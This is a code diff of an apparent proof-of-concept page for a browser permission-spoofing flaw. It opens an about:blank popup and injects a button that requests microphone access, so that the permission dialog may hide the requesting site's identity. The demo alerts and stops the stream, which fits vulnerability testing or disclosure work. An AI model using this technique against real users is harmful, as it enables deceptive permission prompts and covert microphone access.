@@ -67,41 +67,50 @@
 
 <script>
     function launchVulnerability() {
-        // Open a blank popup
         const popup = window.open("about:blank", "poc_window", "width=500,height=450");
         
         if (!popup) {
-            alert("Popup blocked! Please allow popups for this site and try again.");
+            alert("Popup blocked!");
             return;
         }
 
-        // The JavaScript code to be executed inside the about:blank window
-        // Using javascript: protocol in an <a> tag to trigger the permission
-        const triggerCode = "javascript:navigator.mediaDevices.getUserMedia({audio: true}).then(s => { alert('Success: Access Granted'); s.getTracks().forEach(t => t.stop()); }).catch(e => alert('Error: ' + e));";
-
-        // Inject content into the popup
-        popup.document.body.innerHTML = `
+        // Gunakan fungsi yang rapi di dalam popup
+        const htmlContent = `
             <div style="font-family: sans-serif; padding: 30px; text-align: center; border: 2px dashed #d9534f; border-radius: 10px; margin: 10px;">
                 <h3 style="color: #333;">Target Window</h3>
                 <p style="color: #666; font-size: 14px;">Context: <code>about:blank</code></p>
                 <div style="margin: 30px 0;">
-                    <a href="${triggerCode}" style="
+                    <button id="triggerBtn" style="
                         display: inline-block; 
                         padding: 15px 25px; 
                         background: #d9534f; 
                         color: white; 
-                        text-decoration: none; 
+                        border: none;
+                        cursor: pointer;
                         border-radius: 8px;
                         font-weight: bold;
                         box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-                    ">2. Trigger Audio Permission</a>
+                    ">2. Trigger Audio Permission</button>
                 </div>
                 <p style="font-size: 13px; color: #888;">
                     If vulnerable, the system dialog will hide the site's identity.
                 </p>
             </div>
+            <script>
+                document.getElementById('triggerBtn').addEventListener('click', async () => {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({audio: true});
+                        alert('Success: Access Granted');
+                        stream.getTracks().forEach(t => t.stop());
+                    } catch (e) {
+                        alert('Error: ' + e.name + " - " + e.message);
+                    }
+                });
+            <\/script>
         `;
-        
+
+        popup.document.write(htmlContent);
+        popup.document.close();
         popup.focus();
     }
 </script>
